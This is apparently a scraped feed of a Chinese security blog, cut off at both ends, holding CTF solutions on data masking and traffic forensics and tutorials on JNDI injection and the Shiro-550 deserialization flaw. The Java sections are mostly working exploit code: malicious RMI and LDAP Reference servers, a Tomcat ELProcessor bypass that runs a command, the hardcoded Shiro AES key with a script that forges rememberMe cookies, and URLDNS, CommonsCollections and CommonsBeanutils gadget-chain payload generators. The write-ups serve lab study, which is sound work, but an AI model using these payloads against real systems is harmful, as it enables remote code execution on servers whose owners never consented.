\u0026#39;622848\u0026#39;, \u0026#39;622700\u0026#39;, \u0026#39;621700\u0026#39;, \u0026#39;622262\u0026#39;, \u0026#39;622188\u0026#39;, \u0026#39;622200\u0026#39;, \u0026#39;622568\u0026#39;, \u0026#39;622609\u0026#39;, \u0026#39;622908\u0026#39;, \u0026#39;622518\u0026#39; } def luhn_check(card_number): \u0026#34;\u0026#34;\u0026#34;Luhn算法校验\u0026#34;\u0026#34;\u0026#34; total = 0 # 从右到左遍历 for i, digit in enumerate(reversed(card_number)): num = int(digit) if i % 2 == 1: # 偶数位（从右往左数，索引从0开始） num *= 2 if num \u0026gt; 9: num = num // 10 + num % 10 # 各位数字相加 total += num return total % 10 == 0 def is_valid_bankcard(card_str): \u0026#34;\u0026#34;\u0026#34;验证银行卡号\u0026#34;\u0026#34;\u0026#34; # 检查长度 if len(card_str) \u0026lt; 16 or len(card_str) \u0026gt; 19: return False # 检查是否全为数字 if not card_str.isdigit(): return False # 检查常见前缀 has_common_prefix = any(card_str.startswith(prefix) for prefix in common_bankcard_prefixes) if not has_common_prefix: return False # Luhn算法校验 return luhn_check(card_str) # IP地址模式 ip_pattern = r\u0026#39;(?\u0026lt;!\\d)(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(?!\\d)\u0026#39; def is_valid_ip(ip_str): parts = ip_str.split(\u0026#39;.\u0026#39;) if len(parts) != 4: return False for part in parts: if not 0 \u0026lt;= int(part) \u0026lt;= 255: return False return True # MAC地址模式 mac_pattern = r\u0026#39;[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\u0026#39; def is_valid_mac(mac_str): return True results = [] with open(filename, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() check = [] # 用于排除手机号取身份证前11位的情况 # 身份证匹配 for match in re.findall(id_pattern, content): if is_valid_id(match): check.append(match[:11]) results.append([\u0026#39;idcard\u0026#39;, match]) # 手机号匹配 for match in re.finditer(phone_pattern, content): full_match = match.group() if is_valid_phone(full_match): if full_match[0] == \u0026#34; \u0026#34;: full_match = full_match[1:len(full_match)] if full_match not in check: results.append([\u0026#39;phone\u0026#39;, full_match.strip() ]) # 银行卡号匹配 bankcard_matches = re.findall(bankcard_pattern, content) for match in bankcard_matches: if is_valid_bankcard(match): results.append([\u0026#39;bankcard\u0026#39;, match]) # IP地址匹配 ip_matches = re.findall(ip_pattern, content) for match in ip_matches: if is_valid_ip(match): results.append([\u0026#39;ip\u0026#39;, match]) # MAC地址匹配 mac_matches = re.findall(mac_pattern, content) for match in mac_matches: if is_valid_mac(match): results.append([\u0026#39;mac\u0026#39;, match]) with open(\u0026#39;output.csv\u0026#39;, \u0026#39;w\u0026#39;, newline=\u0026#39;\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: writer = csv.writer(f) writer.writerow([\u0026#39;category\u0026#39;, \u0026#39;value\u0026#39;]) writer.writerows(results) extract_and_save(\u0026#39;data.txt\u0026#39;) 2025 能源网络安全大赛 数据脱敏 为了抵抗黑客攻击导致数据拖库等问题，需要将敏感数据识别并脱敏存储成⼀个表。给定脱敏算法逻辑，要求选⼿⽣成脱敏后的数据表数据（所有数据均为随机⽣成，与现实世界⽆任何联系）。为了防⽌⼀些隐私数据泄漏，现需要对该数据表进⾏脱敏操作，请按照指定要求对各字段进⾏脱敏处理，并按照先行后列拼接字符串（不包含标题行），对此字符串进行md5计算，得到答案。\n脱敏要求：\n编号：⽆需脱敏。\r姓名：⼆字姓名对最后⼀位字使⽤ * 进⾏替换，三字姓名对中间⼀位字使⽤ * 进⾏替换，四字姓名对中间两位字使⽤ * 进⾏替换。\r手机号：请对中间五位信息使⽤ * 进⾏替换。\r身份证号码：请对除了前6位信息使⽤ * 进⾏替换。\r银⾏卡：请对前四位和后十位信息使⽤ * 进⾏替换。\rEmail：请对字符 @ 前除 . 外的字符使⽤ * 进⾏替换。\r性别：替换成未知。\r微信号：请对为字符的信息使用 * 进行替换。 import pandas as pd import string import hashlib df_dict = pd.read_excel(\u0026#34;data.xlsx\u0026#34;, sheet_name=[\u0026#34;Sheet1\u0026#34;], header=0) df_sheet1 = df_dict[\u0026#39;Sheet1\u0026#39;] # 数据提取 id = df_sheet1[\u0026#39;编号\u0026#39;] name = df_sheet1[\u0026#39;姓名\u0026#39;] phone = df_sheet1[\u0026#39;手机号\u0026#39;] idcard = df_sheet1[\u0026#39;身份证号\u0026#39;] bankcard = df_sheet1[\u0026#39;银行卡号\u0026#39;] email = df_sheet1[\u0026#39;Email\u0026#39;] gender = df_sheet1[\u0026#39;性别\u0026#39;] wechat = df_sheet1[\u0026#39;微信号\u0026#39;] # 编号无需脱敏 # 姓名：⼆字姓名对最后⼀位字使⽤ * 进⾏替换，三字姓名对中间⼀位字使⽤ * 进⾏替换，四字姓名对中间两位字使⽤ * 进⾏替换。 def name_desensitization(current_name): n = len(current_name) if n == 2: desensitized_name = current_name[0] + \u0026#39;*\u0026#39; elif n == 3: desensitized_name = current_name[0] + \u0026#39;*\u0026#39; + current_name[2] elif n == 4: desensitized_name = current_name[0] + \u0026#39;**\u0026#39; + current_name[3] else: desensitized_name = current_name return desensitized_name # 手机号：请对中间五位信息使⽤ * 进⾏替换。 def phone_desensitization(current_phone): current_phone = str(current_phone) desensitized_phone = current_phone[0:3] + \u0026#39;*\u0026#39;*5 + current_phone[8:] return desensitized_phone # 身份证号码：请对除了前6位信息使⽤ * 进⾏替换。 def idcard_desensitization(current_idcard): current_idcard = str(current_idcard) desensitized_idcard = current_idcard[0:6] + \u0026#39;*\u0026#39;*12 return desensitized_idcard # 银⾏卡：请对前四位和后十位信息使⽤ * 进⾏替换。 def bankcard_desensitization(current_bankcard): current_bankcard = str(current_bankcard) desensitized_bankcard = current_bankcard[:4] + \u0026#39;*\u0026#39;*(len(current_bankcard)-14) + current_bankcard[-10:] return desensitized_bankcard # Email：请对字符 @ 前除 . 外的字符使⽤ * 进⾏替换。 def email_desensitization(current_email): desensitized_email = \u0026#39;\u0026#39; for i in range(len(current_email)): if current_email[i] == \u0026#39;@\u0026#39;: desensitized_email += current_email[i:] return desensitized_email else: if current_email[i] != \u0026#39;.\u0026#39;: desensitized_email += \u0026#39;*\u0026#39; else: desensitized_email += current_email[i] # 性别：替换成未知。 def gender_desensitization(current_gender): desensitized_gender = \u0026#39;未知\u0026#39; return desensitized_gender # 微信号：请对为字符的信息使用 * 进行替换。 chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + \u0026#39;_\u0026#39; def wechat_desensitization(current_wechat): desensitized_wechat = \u0026#39;\u0026#39; for i in range(len(current_wechat)): if current_wechat[i] in chars: desensitized_wechat += \u0026#39;*\u0026#39; else: desensitized_wechat += current_wechat[i] return desensitized_wechat # 数据脱敏 name_desensitized = name.apply(name_desensitization) phone_desensitized = phone.apply(phone_desensitization) idcard_desensitized = idcard.apply(idcard_desensitization) bankcard_desensitized = bankcard.apply(bankcard_desensitization) email_desensitized = email.apply(email_desensitization) gender_desensitized = gender.apply(gender_desensitization) wechat_desensitized = wechat.apply(wechat_desensitization) with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: for data_index in range(len(id)): f.write(name_desensitized[data_index]+phone_desensitized[data_index]+idcard_desensitized[data_index]+bankcard_desensitized[data_index]+email_desensitized[data_index]+gender_desensitized[data_index]+wechat_desensitized[data_index]) with open(\u0026#39;output.txt\u0026#39;, \u0026#39;r\u0026#39;) as ff: # 计算文件md5 md5 = hashlib.md5(ff.read().encode(\u0026#39;UTF-8\u0026#39;)).hexdigest() print(md5) 2025 红明谷杯 题目内容：某企业网络安全部门人员正在对企业网络资产受到的攻击行为进行溯源分析，该工作人员发现攻击者删除了一段时间内的访问日志数据，但是攻击者曾传输过已被删除的访问日志数据并且被流量监控设备捕获，工作人员对流量数据进行了初步过滤并提取出了相应数据包。已知该攻击者在开始时曾尝试低密度的攻击，发现未被相关安全人员及时发现后进行了连续多日的攻击，请协助企业排查并定位攻击者IP，flag格式为：flag{md5(IP)}\n先用tshark导出data.data字段的base64数据，默认输出的是hex的数据：\ntshark -r network_traffic.pcap -T fields -e data.data tcp \u0026gt; 1.txt 先解hex，再解base64：\nimport base64 import json with open(\u0026#39;1.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f, open(\u0026#39;2.txt\u0026#39;, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as ff: lines = f.readlines() for line in lines: line = line.strip() try: base64_data = bytes.fromhex(line).decode() data = base64.b64decode(base64_data).decode() json_data = json.loads(data) if \u0026#39;msg\u0026#39; in json_data: base64_msg = json_data[\u0026#39;msg\u0026#39;] log = base64.b64decode(base64_msg).decode() ff.write(log + \u0026#39;\\n\u0026#39;) except: print(\u0026#34;decode error\u0026#34;) 日志形式：\n90.97.242.28- - [08/Jan/2025:22:57:37 +0000] \u0026#34;POST /main/search.php HTTP/1.1\u0026#34; 200 2380 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.1)\u0026#34; import re from collections import Counter pattern = r\u0026#39;\\d+\\.\\d+\\.\\d+\\.\\d+(?=-| )\u0026#39; with open(\u0026#39;2.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;latin\u0026#39;) as f: ip = re.findall(pattern, f.read()) # 统计ip出现频率 ip_counts = Counter(ip) # 出现最多次数的ip badip, counts = ip_counts.most_common(1)[0] print(badip, counts) 输出结果：\n35.127.46.111 67 ","permalink":"https://blog.w8nn9z.top/posts/misc/ds/","summary":"","title":"数据安全"},{"content":"JNDI与RMI、LDAP的关系 JNDI (Java Naming and Directory Interface)：是一个接口，一个统一的查询标准，本身不提供服务，只提供一套标准的API来查找东西\nRMI (Remote Method Invocation) 和 LDAP (Lightweight Directory Access Protocol)：是具体的服务，是两种不同类型的实现。它们是真正存储信息、提供对象的地方\nRMI 实现 远程接口 IRmoteObj.java：\nimport java.rmi.Remote; import java.rmi.RemoteException; public interface IRmoteObj extends Remote { String sayHello(String name) throws RemoteException; } 服务器对象实现 RmoteObjImpl.java：\nimport java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RmoteObjImpl extends UnicastRemoteObject implements IRmoteObj{ public RmoteObjImpl() throws RemoteException { super(); } @Override public String sayHello(String name) throws RemoteException { System.out.println(\u0026#34;sayHello\u0026#34;); return name; } } 服务器注册和绑定 RMIServer.java：\nimport java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIServer { public static void main(String[] args) throws Exception { RmoteObjImpl remoteObj = new RmoteObjImpl(); Registry registry = LocateRegistry.createRegistry(1099); registry.rebind(\u0026#34;remoteObj\u0026#34;, remoteObj); } } 客户端查找和调用 RMIClient.java：\nimport java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIClient { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;, 1099); IRmoteObj remoteObj = (IRmoteObj) registry.lookup(\u0026#34;remoteObj\u0026#34;); System.out.println(remoteObj.sayHello(\u0026#34;hello\u0026#34;)); } } JNDI RMI 实现 JNDIRMIServer.java：\nimport javax.naming.InitialContext; import java.rmi.registry.LocateRegistry; public class JNDIRMIServer { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); RmoteObjImpl remoteObj = new RmoteObjImpl(); InitialContext initialContext = new InitialContext(); initialContext.rebind(\u0026#34;rmi://127.0.0.1:1099/remoteObj\u0026#34;, remoteObj); } } JNDIRMIClinet.java：\nimport javax.naming.InitialContext; public class JNDIRMIClient { public static void main(String args[]) throws Exception { InitialContext initialContext = new InitialContext(); IRmoteObj remoteObj = (IRmoteObj) initialContext.lookup(\u0026#34;rmi://127.0.0.1:1099/remoteObj\u0026#34;); System.out.println(remoteObj.sayHello(\u0026#34;hello\u0026#34;)); } } JNDI RMI 注入 攻击者在自己服务器上构造恶意的JNDI RMI服务，JNDIRMIServer.java：\nimport javax.naming.InitialContext; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; public class JNDIRMIServer { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); // RmoteObjImpl remoteObj = new RmoteObjImpl(); InitialContext initialContext = new InitialContext(); // initialContext.rebind(\u0026#34;rmi://127.0.0.1:1099/remoteObj\u0026#34;, remoteObj); Reference refObj = new Reference(\u0026#34;CalcRef\u0026#34;, \u0026#34;CalcRef\u0026#34;, \u0026#34;http://127.0.0.1:1088/\u0026#34;); initialContext.rebind(\u0026#34;rmi://127.0.0.1:1099/remoteObj\u0026#34;, refObj); } } CalcRef.java：\nimport java.io.IOException; public class CalcRef { public CalcRef() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } 同时要求JNDIRMIClient端lookup参数可控，JNDIRMIClient.java：\nimport javax.naming.InitialContext; public class JNDIRMIClient { public static void main(String args[]) throws Exception { InitialContext initialContext = new InitialContext(); IRmoteObj remoteObj = (IRmoteObj) initialContext.lookup(\u0026#34;rmi://127.0.0.1:1099/remoteObj\u0026#34;); // 此处应是攻击者ip System.out.println(remoteObj.sayHello(\u0026#34;hello\u0026#34;)); } } Java 8u121+ (包括 Java 9, 11, 17, 21 等): Oracle 引入了安全补丁，将 com.sun.jndi.rmi.object.trustURLCodebase 默认设置为 false。这直接阻止了 JVM 从 Codebase URL 加载远程类，使 RMI 协议的 JNDI 注入几乎无法利用\nJNDI LADP 注入 import javax.naming.InitialContext; import javax.naming.Reference; public class JNDILDAPServer { public static void main(String[] args) throws Exception { Reference refObj = new Reference(\u0026#34;CalcRef\u0026#34;, \u0026#34;CalcRef\u0026#34;, \u0026#34;http://127.0.0.1:1088/\u0026#34;); InitialContext initialContext = new InitialContext(); initialContext.rebind(\u0026#34;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com\u0026#34;, refObj); } } import javax.naming.InitialContext; public class JNDILDAPClient { public static void main(String[] args) throws Exception { InitialContext initialContext = new InitialContext(); initialContext.lookup(\u0026#34;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com\u0026#34;); } } JNDI jdk高版本注入 需要添加tomcat相关依赖，pom.xml：\n\u0026lt;dependencies\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat.embed\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-embed-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.5.71\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.el\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.el-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.glassfish\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.el\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; JNDIRMIServerHighBypass.java：\nimport org.apache.naming.ResourceRef; import javax.naming.InitialContext; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; public class JNDIRMIServerHighBypass { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); InitialContext initialContext = new InitialContext(); ResourceRef resourceRef = new ResourceRef(\u0026#34;javax.el.ELProcessor\u0026#34;, null, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, true, \u0026#34;org.apache.naming.factory.BeanFactory\u0026#34;, null); resourceRef.add(new StringRefAddr(\u0026#34;forceString\u0026#34;, \u0026#34;x=eval\u0026#34;)); resourceRef.add(new StringRefAddr(\u0026#34;x\u0026#34;, \u0026#34;Runtime.getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;)); initialContext.rebind(\u0026#34;rmi://127.0.0.1:1099/remoteObj\u0026#34;, resourceRef); } } ","permalink":"https://blog.w8nn9z.top/posts/web/jndiinjection/","summary":"","title":"JNDI注入"},{"content":"漏洞复现环境：\ngit clone https://github.com/apache/shiro.git\rcd shiro\rgit checkout shiro-root-1.2.4\rTomcat: 9.0.109\rjdk: 1.8.0_u65 漏洞靶场环境：\nhttps://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437\rdocker compose up -d 漏洞分析 shiro550反序列化漏洞使用了固定key进行AES加解密，特征是请求响应中包含字段rememberMe，先查找对应方法，CookieRemembermeManager类中的getRememberedSerializedIdentity方法：\nprotected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { if (!WebUtils.isHttp(subjectContext)) { if (log.isDebugEnabled()) { String msg = \u0026#34;SubjectContext argument is not an HTTP-aware instance. This is required to obtain a \u0026#34; + \u0026#34;servlet request and response in order to retrieve the rememberMe cookie. Returning \u0026#34; + \u0026#34;immediately and ignoring rememberMe operation.\u0026#34;; log.debug(msg); } return null; } WebSubjectContext wsc = (WebSubjectContext) subjectContext; if (isIdentityRemoved(wsc)) { return null; } HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = getCookie().readValue(request, response); // Browsers do not always remove cookies immediately (SHIRO-183) // ignore cookies that are scheduled for removal if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null; if (base64 != null) { base64 = ensurePadding(base64); if (log.isTraceEnabled()) { log.trace(\u0026#34;Acquired Base64 encoded identity [\u0026#34; + base64 + \u0026#34;]\u0026#34;); } byte[] decoded = Base64.decode(base64); if (log.isTraceEnabled()) { log.trace(\u0026#34;Base64 decoded byte array length: \u0026#34; + (decoded != null ? decoded.length : 0) + \u0026#34; bytes.\u0026#34;); } return decoded; } else { //no cookie set - new site visitor? return null; } } 查找调用getRememberedSerializedIdentity的方法，AbstractRemembermeManager类中的getRememberedPrincipals方法：\npublic PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) { PrincipalCollection principals = null; try { byte[] bytes = getRememberedSerializedIdentity(subjectContext); //SHIRO-138 - only call convertBytesToPrincipals if bytes exist: if (bytes != null \u0026amp;\u0026amp; bytes.length \u0026gt; 0) { principals = convertBytesToPrincipals(bytes, subjectContext); } } catch (RuntimeException re) { principals = onRememberedPrincipalFailure(re, subjectContext); } return principals; } 跟进convertBytesToPrincipals方法：\nprotected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) { if (getCipherService() != null) { bytes = decrypt(bytes); } return deserialize(bytes); } 跟进decrypt方法：\nprotected byte[] decrypt(byte[] encrypted) { byte[] serialized = encrypted; CipherService cipherService = getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey()); serialized = byteSource.getBytes(); } return serialized; } 一直跟进+Find Usages找到加解密方式以及硬编码的key：\npublic byte[] getDecryptionCipherKey() { return decryptionCipherKey; } public void setDecryptionCipherKey(byte[] decryptionCipherKey) { this.decryptionCipherKey = decryptionCipherKey; } public void setCipherKey(byte[] cipherKey) { //Since this method should only be used in symmetric ciphers //(where the enc and dec keys are the same), set it on both: setEncryptionCipherKey(cipherKey); setDecryptionCipherKey(cipherKey); } public AbstractRememberMeManager() { this.serializer = new DefaultSerializer\u0026lt;PrincipalCollection\u0026gt;(); this.cipherService = new AesCipherService(); setCipherKey(DEFAULT_CIPHER_KEY_BYTES); } public DefaultBlockCipherService(String algorithmName) { super(algorithmName); this.modeName = OperationMode.CBC.name(); this.paddingSchemeName = PaddingScheme.PKCS5.getTransformationName(); this.blockSize = DEFAULT_BLOCK_SIZE; //0 = use the JCA provider\u0026#39;s default this.streamingModeName = OperationMode.CBC.name(); this.streamingPaddingSchemeName = PaddingScheme.PKCS5.getTransformationName(); this.streamingBlockSize = DEFAULT_STREAMING_BLOCK_SIZE; } public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException { byte[] encrypted = ciphertext; //No IV, check if we need to read the IV from the stream: byte[] iv = null; if (isGenerateInitializationVectors(false)) { try { //We are generating IVs, so the ciphertext argument array is not actually 100% cipher text. Instead, it //is: // - the first N bytes is the initialization vector, where N equals the value of the // \u0026#39;initializationVectorSize\u0026#39; attribute. // - the remaining bytes in the method argument (arg.length - N) is the real cipher text. //So we need to chunk the method argument into its constituent parts to find the IV and then use //the IV to decrypt the real ciphertext: int ivSize = getInitializationVectorSize(); int ivByteSize = ivSize / BITS_PER_BYTE; //now we know how large the iv is, so extract the iv bytes: iv = new byte[ivByteSize]; System.arraycopy(ciphertext, 0, iv, 0, ivByteSize); //remaining data is the actual encrypted ciphertext. Isolate it: int encryptedSize = ciphertext.length - ivByteSize; encrypted = new byte[encryptedSize]; System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize); } catch (Exception e) { String msg = \u0026#34;Unable to correctly extract the Initialization Vector or ciphertext.\u0026#34;; throw new CryptoException(msg, e); } } return decrypt(encrypted, key, iv); } private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); 可以分析出解密过程：base64decode -\u0026gt; AESdecode -\u0026gt; deserialize，key为base64编码的kPH+bIxk5D2deZiIxcaaaA==，iv是密文开头内容所以不用设置，填充方式为PKCS5，生成恶意Cookie的exp：\nimport base64 import uuid from Crypto.Cipher import AES with open(\u0026#34;ser.bin\u0026#34;, \u0026#34;rb\u0026#34;) as f: data = f.read() BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() # PKCS5 key = \u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34; mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data))) print(ciphertext) URLDNS URLDNS所需依赖都是java内置类，URLDNS.java：\nimport java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class URLDNS { public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static void main(String[] args) throws Exception { HashMap\u0026lt;URL, Integer\u0026gt; hashmap = new HashMap\u0026lt;URL, Integer\u0026gt;(); URL url = new URL(\u0026#34;http://d0otgz.dnslog.cn\u0026#34;); Field hashcode = url.getClass().getDeclaredField(\u0026#34;hashCode\u0026#34;); hashcode.setAccessible(true); hashcode.set(url, 114514); hashmap.put(url, 1); hashcode.set(url, -1); serialize(hashmap); } } CC 由于shiro中不能加载数组类，所以需要拼接CC3,CC2,CC6：\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; import java.util.PriorityQueue; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.beanutils.PropertyUtils; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; public class CC { public static void main(String[] args) throws Exception { // CC3 TemplatesImpl templatesImpl = new TemplatesImpl(); Field _nameField = templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;); _nameField.setAccessible(true); _nameField.set(templatesImpl, \u0026#34;sxc\u0026#34;); Field _bytecodesField = templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;); _bytecodesField.setAccessible(true); byte[] bytecode = Files.readAllBytes(Paths.get(\u0026#34;path\\\\to\\\\Calc.class\u0026#34;)); byte[][] bytecodes = {bytecode}; _bytecodesField.set(templatesImpl, bytecodes); // CC2 InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null); // CC6 HashMap\u0026lt;Object, Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object, Object\u0026gt; lazymap = LazyMap.decorate(hashmap, (new ConstantTransformer(\u0026#34;1\u0026#34;))); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, templatesImpl); HashMap\u0026lt;Object, Object\u0026gt; hm = new HashMap\u0026lt;\u0026gt;(); hm.put(tiedMapEntry, \u0026#34;258\u0026#34;); lazymap.remove(templatesImpl); Class clazz = LazyMap.class; Field factoryField = clazz.getDeclaredField(\u0026#34;factory\u0026#34;); factoryField.setAccessible(true); factoryField.set(lazymap, invokerTransformer); serialize(hm); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException, ClassNotFoundException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } CB CB链：PriorityQueue.readObject -\u0026gt; BeanComparator.compare -\u0026gt; PropertyUtils.getProperty(TemplatesImpl, \u0026quot;outputProperties\u0026quot;) -\u0026gt; TemplatesImpl.getOutputProperties -\u0026gt; defineTransletClasses.defineClass -\u0026gt; getTransletInstance中调用newInstance()\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.PriorityQueue; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.beanutils.PropertyUtils; public class CB { public static void main(String[] args) throws Exception { TemplatesImpl templatesImpl = new TemplatesImpl(); Field _nameField = templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;); _nameField.setAccessible(true); _nameField.set(templatesImpl, \u0026#34;sxc\u0026#34;); Field _bytecodesField = templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;); _bytecodesField.setAccessible(true); byte[] bytecode = Files.readAllBytes(Paths.get(\u0026#34;path\\\\to\\\\Calc.class\u0026#34;)); byte[][] bytecodes = {bytecode}; _bytecodesField.set(templatesImpl, bytecodes); // PropertyUtils.getProperty(templatesImpl, \u0026#34;outputProperties\u0026#34;); BeanComparator beanComparator = new BeanComparator(\u0026#34;outputProperties\u0026#34;, new AttrCompare()); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templatesImpl); priorityQueue.add(2); Field comparatorField = priorityQueue.getClass().getDeclaredField(\u0026#34;comparator\u0026#34;); comparatorField.setAccessible(true); comparatorField.set(priorityQueue, beanComparator); serialize(priorityQueue); } public static void serialize(Object obj) throws IOException, ClassNotFoundException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } } 参考资料：\nhttps://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437\nhttps://arrnitage.github.io/Shiro-550/\nhttps://www.bilibili.com/video/BV1dq4y1B76x\n","permalink":"https://blog.w8nn9z.top/posts/web/shiro550/","summary":"","title":"shiro550反序列化漏洞"},{"content":"2021 东华杯 ezgadget IndexController类：\npackage com.ezgame.ctf.controller; import com.ezgame.ctf.tools.Tools; import java.io.ByteArrayInputStream; import java.io.InputStream; import java.io.ObjectInputStream; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.springframework.beans.factory.xml.BeanDefinitionParserDelegate; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.ResponseBody; @Controller /* loaded from: ezgadget.jar:BOOT-INF/classes/com/ezgame/ctf/controller/IndexController.class */ public class IndexController { @RequestMapping({\u0026#34;/\u0026#34;}) @ResponseBody public String index(HttpServletRequest request, HttpServletResponse response) { return BeanDefinitionParserDelegate.INDEX_ATTRIBUTE; } @RequestMapping({\u0026#34;/readobject\u0026#34;}) @ResponseBody public String unser(@RequestParam(name = \u0026#34;data\u0026#34;, required = true) String data, Model model) throws Exception { byte[] b = Tools.base64Decode(data); InputStream inputStream = new ByteArrayInputStream(b); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); String name = objectInputStream.readUTF(); int year = objectInputStream.readInt(); if (name.equals(\u0026#34;gadgets\u0026#34;) 